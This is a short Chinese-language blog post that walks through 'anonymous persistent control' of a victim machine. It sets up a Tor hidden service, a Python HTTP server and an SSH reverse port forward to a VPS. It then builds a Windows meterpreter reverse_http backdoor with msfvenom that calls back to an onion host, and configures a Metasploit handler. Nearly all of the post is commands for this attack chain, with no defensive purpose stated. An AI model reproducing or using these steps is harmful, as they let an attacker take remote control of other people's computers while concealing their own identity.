---
layout:     post
title:      Tor Fronting 匿名攻击
author:     wooy0ung
tags: 		dos
category:  	exploit
---


>利用 VPS 作为跳板强化可持续控制, 但还是会泄漏一部分个人信息。  
>Tor Hidden Services 提供了隐藏自身网络的服务, 它提供了一个唯一并且匿名的 hostname, 配合 VPS 进行流量转发, 最终实现匿名持续控制。  
![](/assets/img/exploit/2017-09-02-tor-fronting/0x00.png)
<!-- more -->


### 0x00 config Tor Hidden Services

查看系统版本

```
$ lsb_release -a
```

![](/assets/img/exploit/2017-09-02-tor-fronting/0x01.png)

选择对应的版本, [传送门](https://www.torproject.org/docs/debian.html.en#ubuntu)

![](/assets/img/exploit/2017-09-02-tor-fronting/0x02.png)

按提示要求安装, 然后编辑 /etc/tor/torrc 文件(取消注释)

```
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8080
```

重启 Tor 服务

```
$ sudo service tor restart
```


### 0x01 开启 HTTPServer

查看 hostname

```
$ sudo cat /var/lib/tor/hidden_service/hostname
```

打开服务

```
$ cd /tmp
$ python -m SimpleHTTPServer 8080
```

端口转发

```
$ ssh -N -R 8080:192.168.1.104:8080 root@VPS_IP
```


### 0x02 payload & exploit

生成 http 反弹后门

```
$ msfvenom -p windows/meterpreter/reverse_http lhost=xxx.onion.link lport=80 -f exe > shell.exe
```

设置好 msf

```
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_http
msf exploit(handler) > set lhost 192.168.1.104
msf exploit(handler) > set lport 8080
msf exploit(handler) > set exitonsession false
msf exploit(handler) > exploit -j
```

在 Victim's machine 执行 payload, getshell~

![](/assets/img/exploit/2017-09-02-tor-fronting/0x03.png)